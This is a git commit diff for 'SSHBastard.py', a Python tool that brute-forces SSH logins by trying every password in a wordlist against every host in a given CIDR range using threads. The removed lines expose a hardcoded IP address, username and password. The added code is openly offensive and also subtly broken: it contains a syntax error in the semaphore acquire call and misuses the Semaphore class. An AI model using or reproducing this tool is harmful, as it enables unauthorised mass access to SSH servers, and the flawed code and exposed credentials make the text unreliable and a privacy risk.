a33c481207722e01e92d7957af56c85bee584e5e
calfcrusher <calfcrusher@inventati.org>
2021-09-01 12:27:37 +0200

    Update SSHBastard.py

--- SSHBastard.py
+++ SSHBastard.py
@@ -6,40 +6,87 @@
 # Also if you think that on entire internet will be a couple of misconfigured
 # ssh server don't loose your time. Keep studying and coding.
 
+import optparse
+import time
 import os
+import threading
+import ipaddress
 
 from pexpect import pxssh
+from termcolor import colored
 
 
-def send_command(s, cmd):
-    """Function to send commands to remote server"""
+maxConnections = 50000
+connection_lock = threading.Semaphore
+FOUND = False
+FAILS = 0
 
-    s.sendline(cmd)
-    s.prompt()
-    print(s.before)
 
-def connect(host, user, password):
-    """Function to connect to server and try to login"""
+def connect(host, user, password, release):
+    """Function to connect to ssh server"""
+
+    global FOUND
+    global FAILS
 
     try:
         s = pxssh.pxssh()
-        s.force_password = True
         s.login(host, user, password)
-        return s
-    except pxssh.ExceptionPxssh as e:
-        print('[!] Failed to login')
-        print(e)
+        print(colored('[+] Password FOUND: ' + password + " for user " + user + " on " + host), 'red')
+        FOUND = True
+    except Exception as e:
+        # if socket is 'read_non- blocking' we assume that SSH server is maxed out at number of connections
+        if 'read_nonblocking' in str(e):
+            FAILS += 1
+            # Sleep a little before trying again the same password
+            time.sleep(5)
+            connect(host, user, password, False)
+        # if pxssh is having difficult obtaining command prompt, just sleep
+        elif 'synchronize with original prompt' in str(e):
+            time.sleep(1)
+            connect(host, user, password, False)
+    finally:
+        if release:
+            connection_lock.release()
+
 
 def main():
     """Main function of tool"""
 
-    host = "31.193.129.219"
-    user = "chris"
-    password = "jkshdfiDFFFuahsfs90f90sdyf"
-    connection = connect(host, user, password)
-    send_command(connection, 'whoami')
+    parser = optparse.OptionParser('./ssh-bastard.py -H <CIDR> -u <user> -F <passwordfile>')
+    parser.add_option('-H', dest='cidr', type='string', help='specify a CIDR')
+    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
+    parser.add_option('-u', dest='user', type='string', help='specify the user')
+    (options, args) = parser.parse_args()
+    cidr = options.cidr
+    passwdFile = options.passwdFile
+    user = options.user
+
+    if cidr is None or passwdFile is None or user is None:
+        print(parser.usage)
+        exit(0)
+
+    with open(passwdFile) as f:
+        for line in f.readlines():
+            if FOUND:
+                # Exit from cycle if password is found
+                print("[*] ONE PASSWORD FOUND! Exiting..")
+                exit(0)
+            if FAILS > 5:
+                # Also exit from cycle if we have too many sockets timeouts
+                print("[!] Exiting: Too Many Socket Timeouts")
+                exit(0)
+
+            connection_lock.acquire(self=)
+            password = line.strip('\r').strip('\n')
+
+            # Reading CIDR
+            for ip in ipaddress.IPv4Network(cidr):
+                print("[-] Testing: " + str(password) + " for user " + user + " on host " + str(ip))
+                t = threading.Thread(target=connect, args=(ip, user, password, True))
+                t.start()
 
 
-if __name__ == "__main__":
-    os.system('clear')
+if __name__ == '__main__':
+    os.system("clear")
     main()
+
